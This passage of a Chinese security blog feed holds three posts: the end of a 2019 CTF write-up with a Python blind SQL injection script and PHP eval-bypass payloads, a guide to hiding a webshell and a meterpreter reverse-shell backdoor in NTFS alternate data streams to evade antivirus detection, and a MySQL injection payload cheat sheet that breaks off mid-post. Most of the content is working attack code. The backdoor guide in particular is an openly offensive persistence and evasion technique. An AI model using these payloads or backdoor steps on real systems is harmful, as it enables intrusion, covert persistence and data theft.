Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$flag-&gt;token = <span class="string">'b706835de79a2b4e80506f582af3676a'</span>;</span><br><span class="line">$flag-&gt;token_flag = &amp;$flag-&gt;token;</span><br><span class="line"></span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line"></span><br><span class="line">$s = serialize($handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode($s);</span><br></pre></td></tr></table></figure></p><p>parse_url绕过正则:<a href="http://lawlietweb.com/2018/05/13/parse_url/" target="_blank" rel="noopener">http://lawlietweb.com/2018/05/13/parse_url/</a><br>wake_up绕过:<a href="https://paper.seebug.org/39/" target="_blank" rel="noopener">https://paper.seebug.org/39/</a></p><h2 id="Web2-全宇宙最简单的SQL"><a href="#Web2-全宇宙最简单的SQL" class="headerlink" title="Web2 - 全宇宙最简单的SQL"></a>Web2 - 全宇宙最简单的SQL</h2><p>过滤 or if sleep benchmark<br>参考bctf-love-q利用pow()在条件为假时返回error</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/55CC5315-17DB-49AC-BBF3-8B0316AA3933.png" alt="2cb4372b6213be745ecbf701adc81349.png"><br>运算符作条件判断，如果错误数据库报错：利用pow的溢出判断limit位数的ascii</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/DF663A7F-EB5F-41F6-9BFE-AE5A783CCF84.png" alt="f4abcef6f90ea02665adaf0f61d6ee7f.png"></p><p>在题目中正确返回<code>登陆失败</code>，错误返回<code>数据库失败</code></p><p>Exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VERSION = <span class="string">"version()"</span></span><br><span class="line">USERNAME = <span class="string">"select username from user limit 1"</span></span><br><span class="line"></span><br><span class="line">PASSWORD = <span class="string">"select (select e.2 from (select * from (select 1)a,(select 2)b union select * from user)e limit 1,1)"</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://cba0e34ee5d34db985195191f4c681d5c32c4b92db574826.changame.ichunqiu.com"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"1'-pow(2,1024-ascii(substr((&#123;data&#125;),&#123;pos&#125;,1))+&#123;code&#125;)-- -"</span>.format(</span><br><span class="line">                data=PASSWORD,</span><br><span class="line">                pos=i,</span><br><span class="line">                code=j</span><br><span class="line">            ),</span><br><span class="line">            <span class="string">"password"</span>: <span class="string">"1"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = requests.post(url=url, data=payload)</span><br><span class="line">            resp.encoding = <span class="string">'utf8'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'数据库操作失败'</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">                result += chr(j)</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure></p><p>利用mysql别名(参考博客中Mysql Injection中# 不用列名的注入)</p><p>跑出password : F1AG@1s-at_/fll1llag_h3r3</p><p>进入后台为远程数据库连接界面，理想到fake_mysqlServer读文件<br>参考文章<a href="https://xz.aliyun.com/t/3973" target="_blank" rel="noopener">https://xz.aliyun.com/t/3973</a></p><p>修改这个脚本里的filelist<br><a href="https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></p><p>然后让题目服务器连接即可<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/F8CE6FAF-1BFD-4AFB-A159-BC74B5293451.png" alt="02c5946724036ffaa593060d7224fd1e.png"></p><h2 id="Web3-lovemath"><a href="#Web3-lovemath" class="headerlink" title="Web3 - lovemath"></a>Web3 - lovemath</h2><p>直接嫖队友@hpdoger的wp orz</p><p>读到calc.php的源码</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/C1913B0F-8DBC-4BD0-9583-36531EC420C2.png" alt="c0c0c8ac3e259e0335021d7fc0e1bfc5.png"><br>黑名单肯定是绕不过去，虽然有/m但是\r在黑名单所以不存在换行绕过。注意看下面的whitelist。正则匹配函数名，只允许Eval使用白名单的函数做字符串<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/D83550D5-CAC5-4A66-9045-18A3FB752007.png" alt="582784a9189b198632e7d5e7a118484b.png"><br>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。<br>由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/36E22A60-B77B-47E1-867B-07D443465D5F.png" alt="e8e3debbd6230c0e0c53a3850e2b76bb.png"><br>想办法把数字变成字母，着眼于函数base_convert，官方描述如下<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/BF93901B-2E8A-4809-A62C-C1D00CDC6E60.png" alt="a2935dc80f85880f2cdda71c2a7086b4.png"><br>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字-&gt;字母的转化，成功打印Phpinfo如下<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/0F5DF72A-16AC-4AC0-B59F-1D020A081AC2.png" alt="098411eef0c09290073abf8ec9ee4ab5.png"><br>因为字符串长度限制，我最开始的想法是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$input = hexdec(bin2hex(“system(‘cat /flag’);”))</span><br><span class="line">$result = base_convert(10进制编码的hex2bin,10,36).dechex($input)</span><br></pre></td></tr></table></figure></p><p>失败的POC是这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</span><br></pre></td></tr></table></figure></p><p>bin2hex后由于转换出来的16进制数值过大，导致转换的int值很大无法正常被dechex还原而溢出。 </p><p>卡在这里很久，最后换了一种小数还原的思路。</p><p>我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。</p><p>Payload如下，注意用白名单的值作为变量参数，否则还是会被拦截<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;)</span><br></pre></td></tr></table></figure></p><p>转换的调用栈如下：<br><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/9EFBD255-8430-47D2-A40A-4B63B559FECE.png" alt="669c053c37997706f12d06ce72e2e1d5.png"></p><p>直接发包给到C参数，成功getflag</p><p><img src="/第十二届全国大学生信息安全竞赛初赛Write up.resources/3C6255C6-8A8E-4A12-8CCA-0273C55AB6C5.png" alt="511c651f1848294771ccadfac4b993eb.png"></p><p>还在群里看到一位师傅的Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="number">47138</span>,<span class="number">20</span>,<span class="number">36</span>)(base_convert(<span class="number">3761671484</span>,<span class="number">13</span>,<span class="number">36</span>)(dechex(<span class="number">474260465194</span>)))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(nl f*);</span><br></pre></td></tr></table></figure><p>79位…… orz </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-04-23 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[30865]ジャンヌ-61097279.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ADS隐藏后门</title>
    <link href="http://patrilic.top/2019/04/18/ADS%20%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
    <id>http://patrilic.top/2019/04/18/ADS 隐藏后门/</id>
    <published>2019-04-18T03:20:33.000Z</published>
    <updated>2019-08-16T05:17:36.753Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-04-18 11:20:33<br><img src="/wallpaper/[32534]r-63888719.jpg" alt><br>高铁上没事干，把以前的笔记总结一下<br>[toc]</p></blockquote><h2 id="ADS"><a href="#ADS" class="headerlink" title="ADS"></a>ADS</h2><p>NTFS交换数据流（alternate data streams，简称ADS）</p><p>ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。 —– baike.baidu.com</p><p>文件命名：</p><blockquote><p>ads.txt  普通txt文件 (主文件)<br>ads.txt:nop.txt （寄宿文件）</p></blockquote><p><img src="/ADS 隐藏后门.resources/8C8EB255-7B79-4D1A-A316-5DE2363EBBFD.png" alt="1bb96e55543dbb1493165cec47afc7af"><br>使用<strong>dir</strong>命令不能看到，必须使用<strong>dir /r</strong></p><p><img src="/ADS 隐藏后门.resources/A87A52A9-85B3-4001-B520-699A9ED67E9C.png" alt="d3973b4bd310ff1bd21deb5db2873e18"></p><h2 id="Webshell（过D盾）"><a href="#Webshell（过D盾）" class="headerlink" title="Webshell（过D盾）"></a>Webshell（过D盾）</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">phpStudy</span>\<span class="title">PHPTutorial</span>\<span class="title">WWW</span>\<span class="title">webshell</span>&gt;<span class="title">echo</span> "&lt;?<span class="title">php</span> <span class="title">phpinfo</span>();?&gt;" &gt; <span class="title">index.php:s</span>.<span class="title">txt</span></span></span><br></pre></td></tr></table></figure><p><img src="/ADS 隐藏后门.resources/C4AC74E5-DDB5-4C32-A202-1E55FC5FA815.png" alt="b2ed2bf9d1766135d674e36ab42aa1ac"><br><img src="/ADS 隐藏后门.resources/762C93D1-3F06-4970-B734-B85E9F18AEC0.png" alt="f40f0ed3186d78429c5000521b823e72"></p><p>将 小马写入index.php:s.txt中 ，然后再index.php中include<br>D盾不能获取非主文件流<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">    $a=&quot;696e6465782e70&quot;.&quot;68703a732e747874&quot;;</span><br><span class="line">    $b=&quot;a&quot;;</span><br><span class="line">    include(PACK(&apos;H*&apos;,$$b))</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">index.php:s.txt</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&apos;chopper&apos;]);?&gt;</span><br></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="0x01-环境"><a href="#0x01-环境" class="headerlink" title="0x01 环境"></a>0x01 环境</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MacOS             ipaddress: <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">223</span></span><br><span class="line">Windows <span class="number">10</span>        ipaddress: <span class="number">192</span>.<span class="number">168</span>.<span class="number">121</span>.<span class="number">132</span></span><br></pre></td></tr></table></figure><h3 id="0x02-生成shell"><a href="#0x02-生成shell" class="headerlink" title="0x02 生成shell"></a>0x02 生成shell</h3><figure class="highlight zsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom --platform Windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 lport=8888 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><h3 id="0x03-植入后门"><a href="#0x03-植入后门" class="headerlink" title="0x03 植入后门"></a>0x03 植入后门</h3><p>环境描述：拿到了webshell，经过提权，权限为本地管理员<br>上传一个后门文件<br><img src="/ADS 隐藏后门.resources/3F4E2390-E7EA-49F4-B362-DC1A776E1262.png" alt="f0f797666014d4cb4f91d9e3e1a1e0ad"></p><p>使用<strong>type</strong>将shell.exe数据写入依附在hello.txt上<br><img src="/ADS 隐藏后门.resources/B3021D0D-E210-4E2E-99CD-E6BD839F0903.png" alt="99090aa172deaf9fe4ef2215b14b5e34"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink "c:\backdoor\link.exe" "c:\backdoor\hello.txt:shell.exe"</span><br></pre></td></tr></table></figure><p>server 2k3后不能直接执行exe，必须建立链接<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">start</span> link.exe /b</span><br></pre></td></tr></table></figure></p><p><img src="/ADS 隐藏后门.resources/5B9ED225-B4D9-4EFA-A8C5-8A64621A194B.png" alt="f2eae722d0632ce91a23eeeafa1d079a"></p><p>成功回弹session</p><h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p><a href="https://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/ms854468(v=msdn.10)</a><br><a href="https://klionsec.github.io/2017/11/13/ntfs-streams/" target="_blank" rel="noopener">https://klionsec.github.io/2017/11/13/ntfs-streams/</a><br><a href="https://blog.csdn.net/migee/article/details/56028011" target="_blank" rel="noopener">https://blog.csdn.net/migee/article/details/56028011</a><br><a href="https://blog.csdn.net/xiaoxuetu_/article/details/77318670" target="_blank" rel="noopener">https://blog.csdn.net/xiaoxuetu_/article/details/77318670</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-04-18 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[32534]r-63888719.jpg&quot; alt&gt;&lt;br&gt;高铁上没事干，把以前的笔记总结一下&lt;br&gt;
      
    
    </summary>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>MySQL Injection Tricks</title>
    <link href="http://patrilic.top/2019/04/14/MySQL%20Injection/"/>
    <id>http://patrilic.top/2019/04/14/MySQL Injection/</id>
    <published>2019-04-14T15:20:33.000Z</published>
    <updated>2019-08-16T05:18:23.142Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-04-14 23:20:33<br><img src="/wallpaper/[33016]Avian Romance-54238596.png" alt></p></blockquote><h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>总结一波MySQL下各式各样等注入技巧～<br><strong>Test Machine Configuration</strong></p><blockquote><p>OS：MacOS Mojave 10.14.2<br>MySQL: MySQL 5.7.19-log</p></blockquote><p>测试表结构：<br><img src="/MySQL Injection.resources/6C53ADB2-2CA5-439F-A4B9-11C003B795A0.png" alt="3dce7ef9e83548ddeb6643a6f075af4f"></p><h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><p>Emmmm，测试失败了<br>翻了一些文章，发现limit之后的analyse() 只适用于<strong>MySQL server version &lt;= 5.6.6</strong></p><p>遂使用 Windows7 x64 + MySQL 5.5.53<br><img src="/MySQL Injection.resources/D3196ADE-0044-4C92-B294-C0F04299F77A.png" alt="26ef60fa552b1e2a9df1c06c0632111b"></p><p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">LIMIT</span> &#123;$uid&#125;,<span class="number">3</span>;</span><br></pre></td></tr></table></figure></p><p>Limit 注入主要是因为后面有一个 PROCEDURE analyse() 存储过程</p><p>构造报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/MySQL Injection.resources/2575E461-4D29-4818-9593-DCD0A35574D2.png" alt="c4033dbc4df97e555bdc39638d337f21"></p><p>因为5.5版本不能使用SELECT，所以只能获取一些配置信息等</p><p><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> <span class="keyword">user</span>  <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">3</span> <span class="keyword">procedure</span> analyse(extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">version</span>())),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">field</span> <span class="keyword">FROM</span> <span class="keyword">table</span> <span class="keyword">WHERE</span> <span class="keyword">id</span> &gt; <span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">1</span>,<span class="number">1</span> <span class="keyword">PROCEDURE</span> analyse((<span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">MID</span>(<span class="keyword">version</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">LIKE</span> <span class="number">5</span>, <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>测试语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid &#123;evil&#125;;</span><br></pre></td></tr></table></figure></p><ol><li>Order by + 报错注入<br><img src="/MySQL Injection.resources/68811865-6608-492B-9EA9-618492DCC0D1.png" alt="69d7117a4def2cf4d7d50d4c44b6ae03"></li></ol><ol start="2"><li><p>order by + 时间盲注<br><img src="/MySQL Injection.resources/7E50257D-D914-4605-B905-974ED4AFFDDC.png" alt="68c940c3c115e97f55fcc166249e6d0d"></p></li><li><p>order by + union查询<br><img src="/MySQL Injection.resources/9D8482A7-0738-4C2C-B4F3-071B8CA50E97.png" alt="8635b1761c56ebe9d5b6204f5581517d"></p></li></ol><p>此注入必须使用()包围SQL语句</p><ol start="4"><li>order by + regexp 盲注<br><img src="/MySQL Injection.resources/B5D21FEE-C714-4CD3-846F-CBDA2AF2129A.png" alt="27b6b63f4a93c01d5f57ee0a75c7efea"></li></ol><p>这里解释一下语句<br>当正则未匹配到数据时候返回的结果是0 所以SQL语句相当于<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>排序不变<br><img src="/MySQL Injection.resources/38FFA41A-A8DA-4AE5-ACB7-FD4E5A91F294.png" alt="5a9b7d8ee50c22ed35efa6fb7e90310d"><br><strong>exp</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> uid <span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x3a</span>,<span class="keyword">user</span>()),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid ^(<span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">version</span>()) regexp <span class="string">'^aaaaaa'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">3</span>))a);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> uid) <span class="keyword">union</span> (<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">version</span>()),<span class="number">3</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure></p><h2 id="from"><a href="#from" class="headerlink" title="from"></a>from</h2><p>测试语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> &#123;$<span class="keyword">Tables</span>&#125;;</span><br></pre></td></tr></table></figure></p><p>直接嵌套子查询<br><img src="/MySQL Injection.resources/3356D524-EEEE-41BB-A7F6-EA9F38B99273.png" alt="37de6926a8a87e69f143bc5f7597342e"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>版本限制： Version &lt;= 5.5.5<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">id</span>, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> ^ <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x)), <span class="string">'patrilic'</span>);</span><br></pre></td></tr></table></figure></p><h2 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="string">'String'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())));</span><br></pre></td></tr></table></figure><blockquote><p>extractvalue(target file，xml path)</p></blockquote><p><img src="/MySQL Injection.resources/E0ADE9FD-0F0C-44E7-95D8-30330401643E.png" alt="53bb49c2016af886807088cd58c0709d"><br><img src="/MySQL Injection.resources/4D36E31A-C0BE-4B4C-9657-25BB4BC7E9DA.png" alt="0e204a12a24b48d87710e60dc9b7a104"></p><h2 id="UpdateXml"><a href="#UpdateXml" class="headerlink" title="UpdateXml"></a>UpdateXml</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="string">'String'</span>,(<span class="keyword">Select</span> <span class="keyword">user</span>()),<span class="string">'String'</span>));</span><br></pre></td></tr></table></figure><blockquote><p>updatexml(Target file，xml path，updateinfo)</p></blockquote><p><img src="/MySQL Injection.resources/B4AE3D11-4B7E-4285-BFE2-A8DF61A86FCA.png" alt="0786dc9cffd391c4dc9aec2cad9bb334"><br><img src="/MySQL Injection.resources/1AAFC23E-4228-4028-82AB-35DA8054C11A.png" alt="b6cbf8fdd04c44eeaa03b702c00ed273"></p><h2 id="name-const"><a href="#name-const" class="headerlink" title="name_const"></a>name_const</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> uid = <span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>),<span class="keyword">name_const</span>(<span class="keyword">version</span>(),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/EA30D650-D0A6-4C03-A248-B3E78D259A1A.png" alt="a02097ebcc3c66a348903385c2e09abf"></p><blockquote><p>name_const(‘1’, 14)<br>局限性很大</p></blockquote><h2 id="整数溢出报错注入"><a href="#整数溢出报错注入" class="headerlink" title="整数溢出报错注入"></a>整数溢出报错注入</h2><p>略</p><h2 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> <span class="keyword">user</span> (uid,username,<span class="keyword">password</span>,city) <span class="keyword">VALUES</span> (?,?,?,?);</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/9C09B58A-2162-4FCF-8988-D8996342E899.png" alt="450be8fc5d042aa1d074506f7d5a93b7"></p><p><img src="/MySQL Injection.resources/4F1A02FF-2B06-4DC8-A883-D1B403287A29.png" alt="f87586d1fd2bcc77a06870c63fd14f28"></p><h2 id="delect"><a href="#delect" class="headerlink" title="delect"></a>delect</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">WHERE</span> uid=&#123;$uid&#125;;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/C12A30AB-E4A6-4FF2-A383-08C1F7C0398E.png" alt="fdf530943ba24e6ec996a845e0b939cb"></p><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="keyword">user</span> <span class="keyword">SET</span> <span class="keyword">password</span> = &#123;$<span class="keyword">password</span>&#125; <span class="keyword">Where</span> username = &#123;session.user&#125; <span class="keyword">and</span> uid = &#123;session.uid&#125;</span><br></pre></td></tr></table></figure><p><img src="/MySQL Injection.resources/97D8B22C-8B27-4254-9E8B-C288DA88E4FD.png" alt="dcae7f06664c4456708cfdd3159490e9"><br><img src="/MySQL Injection.resources/AA3C9BAB-6ACC-44F4-9FCE-E770566EEFF6.png" alt="84d8c329a9ee3222c4c075648707d4e5"></p><h2 id="into-outfile"><a 